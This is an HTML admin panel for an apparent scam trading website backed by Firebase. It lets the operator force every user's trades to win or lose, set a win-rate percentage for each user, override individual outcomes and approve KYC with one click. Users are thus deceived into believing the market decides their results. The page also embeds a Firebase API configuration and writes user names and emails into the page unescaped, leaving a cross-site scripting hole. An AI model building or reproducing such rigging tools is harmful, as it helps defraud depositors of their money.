<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Master Control | VIP Admin</title>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
    <style>
        :root { --bg: #0b0e11; --card: #1e2329; --yellow: #fcd535; --green: #0ecb81; --red: #f6465d; --text: #eaecef; }
        body { background: var(--bg); color: var(--text); font-family: sans-serif; padding: 20px; }
        .section { background: var(--card); padding: 25px; border-radius: 15px; margin-bottom: 25px; border: 1px solid #333; }
        .global-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 15px; }
        .btn { padding: 15px; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; color: white; transition: 0.2s; }
        .btn-win { background: var(--green); } .btn-loss { background: var(--red); } .btn-reset { background: #444; }
        .btn:active { transform: scale(0.95); }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #2b3139; }
        input[type="number"] { background: #2b3139; border: 1px solid #474d57; color: white; padding: 8px; border-radius: 5px; width: 60px; text-align: center; }
        .active-status { padding: 3px 8px; border-radius: 4px; font-size: 11px; font-weight: bold; }
    </style>
</head>
<body>

<div class="section" style="border: 2px solid var(--yellow);">
    <h1 style="margin:0; color:var(--yellow);">🌍 GLOBAL MARKET OVERRIDE</h1>
    <p style="color:#848e9c;">Yahan se aap poori website ke users ko aik sath control kar sakte hain.</p>
    <div class="global-grid">
        <button class="btn btn-win" onclick="setGlobal('WIN')">FORCE WIN ALL</button>
        <button class="btn btn-reset" onclick="setGlobal('NORMAL')">NORMAL MARKET</button>
        <button class="btn btn-loss" onclick="setGlobal('LOSS')">FORCE LOSS ALL</button>
    </div>
    <div id="g-status" style="margin-top:15px; font-weight:bold; text-align:center;">Mode: Loading...</div>
</div>

<div class="section">
    <h2>User Intelligence & Win-Rate Algo</h2>
    <table>
        <thead>
            <tr>
                <th>User</th>
                <th>Balance</th>
                <th>Win Rate (%)</th>
                <th>Quick Manual</th>
                <th>KYC</th>
            </tr>
        </thead>
        <tbody id="user-list"></tbody>
    </table>
</div>

<script>
    const firebaseConfig = { 
        apiKey: "AIzaSyCM_qmcvOXXjJrQHPiracy5SOpTjAJEnYU", 
        authDomain: "trade-for-profit-8b160.firebaseapp.com", 
        databaseURL: "https://trade-for-profit-8b160-default-rtdb.firebaseio.com", 
        projectId: "trade-for-profit-8b160", 
        storageBucket: "trade-for-profit-8b160.firebasestorage.app", 
        messagingSenderId: "1077014018991", 
        appId: "1:1077014018991:web:c41320e2ef10291afd4d5a" 
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // Global Mode Listener
    db.ref('settings/globalControl').on('value', s => {
        const mode = s.val() || "NORMAL";
        const el = document.getElementById('g-status');
        el.innerText = "SYSTEM CURRENTLY SET TO: " + mode;
        el.style.color = mode === 'WIN' ? '#0ecb81' : (mode === 'LOSS' ? '#f6465d' : '#fcd535');
    });

    function setGlobal(val) { db.ref('settings/globalControl').set(val); alert("Global Settings Updated!"); }

    // Users List with Probability Input
    db.ref('users').on('value', snap => {
        const list = document.getElementById('user-list');
        list.innerHTML = "";
        snap.forEach(userSnap => {
            const u = userSnap.val();
            const uid = userSnap.key;
            list.innerHTML += `
                <tr>
                    <td>${u.name}<br><small style="color:#848e9c">${u.email}</small></td>
                    <td>$${u.balance.toFixed(2)}</td>
                    <td>
                        <input type="number" value="${u.winRate || 50}" onchange="updateWinRate('${uid}', this.value)"> %
                    </td>
                    <td>
                        <button class="btn btn-win" style="padding:5px 10px; font-size:10px;" onclick="setUserControl('${uid}', 'WIN')">W</button>
                        <button class="btn btn-loss" style="padding:5px 10px; font-size:10px;" onclick="setUserControl('${uid}', 'LOSS')">L</button>
                        <button class="btn btn-reset" style="padding:5px 10px; font-size:10px;" onclick="setUserControl('${uid}', 'NORMAL')">X</button>
                        <br><small>Now: ${u.control || 'NORMAL'}</small>
                    </td>
                    <td><button onclick="approveKYC('${uid}')" style="font-size:10px;">Verify</button></td>
                </tr>`;
        });
    });

    function updateWinRate(uid, val) { db.ref('users/'+uid).update({ winRate: parseInt(val) }); }
    function setUserControl(uid, val) { db.ref('users/'+uid).update({ control: val }); }
    function approveKYC(uid) { db.ref('users/'+uid).update({ kyc_status: 'APPROVED' }); }
</script>
</body>
</html>
